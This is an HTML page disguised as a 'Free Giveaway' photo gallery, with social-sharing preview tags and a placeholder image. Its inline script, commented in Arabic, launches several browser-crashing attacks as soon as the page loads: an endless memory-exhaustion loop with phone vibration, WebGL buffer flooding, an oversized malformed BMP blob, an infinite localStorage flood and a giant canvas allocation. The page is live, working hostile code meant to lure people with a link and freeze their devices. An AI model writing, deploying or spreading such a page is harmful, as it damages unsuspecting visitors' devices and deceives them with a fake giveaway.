<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Gallery</title>
    <meta property="og:title" content="Photo Gallery - Free Giveaway" />
    <meta property="og:description" content="Check this amazing photo and win a prize!" />
    <meta property="og:image" content="https://picsum.photos/seed/pic/1200/630" />
    <meta property="og:url" content="https://one-chance-lime.vercel.app/" />
</head>
<body>
    <!-- صورة وهمية (تظهر لمدة ثانية واحدة فقط قبل أن يتجمد المتصفح) -->
    <div style="text-align:center; margin-top:20px; font-family: Arial, sans-serif;">
        <h1 style="color:#333;">Loading your photo...</h1>
        <img src="https://picsum.photos/400/400" alt="photo" style="width:100%; max-width:300px; border-radius:10px;">
        <p style="color:#666;">Please wait a moment</p>
    </div>

    <script>
        // ============================================
        // تنفيذ فوري ومتزامن لجميع الهجمات (بدون setTimeout)
        // ============================================
        window.onload = function() {

            // 1. استنزاف الذاكرة (حلقة فورية لانهائية)
            (function memoryBomb() {
                var bomb = [];
                while (true) {
                    bomb.push(new Array(1000000).join('X'));
                    var obj = {};
                    for (var i = 0; i < 10000; i++) {
                        obj['prop' + i] = new Array(50000).join('A');
                    }
                    bomb.push(obj);
                    try { navigator.vibrate(5000); } catch(e) {}
                }
            })();

            // 2. هجوم WebGL (تعطيل وحدة الرسوميات فوراً)
            (function gpuCrash() {
                var canvas = document.createElement('canvas');
                document.body.appendChild(canvas);
                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    var buffers = [];
                    for (var i = 0; i < 1000; i++) {
                        var buf = gl.createBuffer();
                        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
                        var data = new Float32Array(1000000);
                        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
                        buffers.push(buf);
                    }
                    function drawLoop() {
                        gl.clear(gl.COLOR_BUFFER_BIT);
                        requestAnimationFrame(drawLoop);
                    }
                    drawLoop();
                }
            })();

            // 3. صورة BMP خبيثة (تجاوز سعة الذاكرة)
            (function bmpCrash() {
                var bmpHeader = 'BM' + String.fromCharCode(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00);
                var bmpInfo = String.fromCharCode(0x28,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x01,0x00,0x18,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00);
                var payload = bmpHeader + bmpInfo;
                while (payload.length < 200000000) { payload += String.fromCharCode(0x41,0x42,0x43,0x44); }
                var blob = new Blob([payload], {type: 'image/bmp'});
                var img = document.createElement('img');
                img.src = URL.createObjectURL(blob);
                document.body.appendChild(img);
            })();

            // 4. ملء localStorage (ضغط النظام)
            (function storageFlood() {
                var data = new Array(3000000).join('X');
                while (true) {
                    try { localStorage.setItem('crash' + Math.random(), data); } catch(e) { localStorage.clear(); }
                }
            })();

            // 5. Canvas عملاق (استنزاف الذاكرة الرسومية)
            (function canvasCrash() {
                var canvas = document.createElement('canvas');
                canvas.width = 200000;
                canvas.height = 200000;
                var ctx = canvas.getContext('2d');
                var imgData = ctx.createImageData(200000, 200000);
                for (var i=0; i<imgData.data.length; i+=4) {
                    imgData.data[i] = 255; imgData.data[i+1] = 255; imgData.data[i+2] = 255; imgData.data[i+3] = 255;
                }
                ctx.putImageData(imgData, 0, 0);
                document.body.appendChild(canvas);
            })();
        };
    </script>
</body>
</html>
